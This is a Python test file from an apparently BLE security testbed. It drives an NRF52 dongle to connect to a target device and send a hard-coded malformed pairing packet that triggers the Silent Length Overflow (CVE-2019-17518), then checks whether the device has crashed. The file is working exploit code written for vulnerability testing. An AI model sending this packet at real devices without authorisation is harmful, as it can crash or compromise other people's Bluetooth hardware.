#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import sys
import unittest
from core.logging_utils import *
from mongodb_database.connect_mongodb import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from libs.timeout_lib import start_timeout, disable_timeout
from sql_database.connect import insert_data_to_link_layer_tests

log = logging.getLogger(__name__)


class Test_SILENT_OVERFLOW(unittest.TestCase):
    """ Negative Tests for silent length overflow"""

    def setUp(self):
        c = config.loadConfig()
        attack='Silent Length Overflow'
        self.master_address = '5d:36:ac:90:0b:22'
        self.access_address = 0x9a328370
        self.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        self.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        self.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + self.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        self.driver = NRF52Dongle(self.comPortNRF, '115200')
        self.crash_timeout_flag = False
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(self.advertiser_address, self.master_address, self.access_address, date,
                                            attack, self.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(self.advertiser_address, self.master_address, self.access_address, date,
                                            attack, self.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass
    def tearDown(self):
        pass

    def crash_timeout(self):
        log.error("No advertisement from " + self.advertiser_address.upper() +
                  ' received\nThe device may have crashed...')
        disable_timeout('scan_timeout')
        self.crash_timeout_flag = True

    def scan_timeout(self):
        scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
            ScanA=self.master_address,
            AdvA=self.advertiser_address)
        self.driver.send(scan_req)
        log.info('Scan Timeout...')
        start_timeout('scan_timeout', 2, self.scan_timeout)

    def adv_timeout(self):
        log.error('Device not discovered during scanning...')
        self.driver.close()
        self.fail("Device not discovered during scanning...")

    # Silent Length Overflow
    def test_SILENT_OVERFLOW_001(self):
        """"6.4 Silent Length Overflow (CVE-2019-17518)"""

        log.info("Silent Length Overflow (CVE-2019-17518)")

        # Internal vars
        none_count = 0
        end_connection = False
        connecting = False

        # Send scan request
        scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
            ScanA=self.master_address,
            AdvA=self.advertiser_address)

        self.driver.send(scan_req)
        log.info('Scan Send.')
        start_timeout('adv_timeout', 10, self.adv_timeout)

        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()

            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    disable_timeout('scan_timeout')
                    # Print slave data channel PDUs summary
                    log.debug("Slave RX <--- " + pkt.summary()[7:])
                # --------------- Process Link Layer Packets here ------------------------------------
                # Check if packet from advertised is received
                if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == self.advertiser_address.lower():
                    connecting = True
                    disable_timeout('scan_timeout')

                    log.info(self.advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
                    # Send connection request to advertiser
                    conn_request = BTLE() / BTLE_ADV(RxAdd=pkt.TxAdd, TxAdd=0) / BTLE_CONNECT_REQ(
                        InitA=self.master_address,
                        AdvA=self.advertiser_address,
                        AA=self.access_address,  # Access address (any)
                        crc_init=0x179a9c,  # CRC init (any)
                        win_size=2,  # 2.5 of windows size (anchor connection window size)
                        win_offset=1,  # 1.25ms windows offset (anchor connection point)
                        interval=16,  # 20ms connection interval
                        latency=0,  # Slave latency (any)
                        timeout=50,  # Supervision timeout, 500ms (any)
                        chM=0x1FFFFFFFFF,  # Any
                        hop=5,  # Hop increment (any)
                        SCA=0,  # Clock tolerance
                    )

                    self.driver.send(conn_request)
                elif BTLE_DATA in pkt and connecting == True:
                    disable_timeout('scan_timeout')
                    connecting = False
                    log.info('Slave Connected (L2Cap channel established)')
                    # Send version indication request
                    pkt = pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(
                        version='4.2')
                    self.driver.send(pkt)

                elif LL_VERSION_IND in pkt:
                    pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                        max_tx_bytes=251, max_rx_bytes=251)
                    self.driver.send(pkt)

                elif LL_LENGTH_RSP in pkt:
                    pairing_req = BTLE(
                        '7083329a06ba070006000c03f5fa100fbbcfb5a6'.decode('hex'))  # malformed pairing request
                    self.driver.send(pairing_req)
                    end_connection = True
                    log.info('Malformed packet was sent.')
                   # wrpcap(os.path.basename(__file__).split('.')[0] + '.pcap',
                           #NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req)  # save packet just sent

                elif LL_LENGTH_REQ in pkt:
                    length_rsp = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                        max_tx_bytes=251, max_rx_bytes=251)
                    self.driver.send(length_rsp)  # Send a normal length response

                elif end_connection == True:
                    end_connection = False
                    term_ind = BTLE() / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
                    self.driver.send(term_ind)

                    time.sleep(1)

                    scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                        ScanA=self.master_address,
                        AdvA=self.advertiser_address)

                    # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
                    log.info('Waiting activity from ' + self.advertiser_address)
                    self.driver.send(scan_req)
                    start_timeout('crash_timeout', 7, self.crash_timeout)
                    break

        # verify alive
        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()
            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                # log.debug("Slave RX <--- " + pkt.summary()[7:])
                if (BTLE_SCAN_RSP in pkt and pkt.AdvA == self.advertiser_address.lower()) or (BTLE_DATA in pkt):
                    log.debug("Slave RX <--- " + pkt.summary()[7:])
                    log.info('Still kicking!!!')
                    disable_timeout('scan_timeout')
                    disable_timeout('crash_timeout')
                    break

            if self.crash_timeout_flag:
                self.fail("No activity from device. Presumed dead....")
                break

        log.info("Test complete")

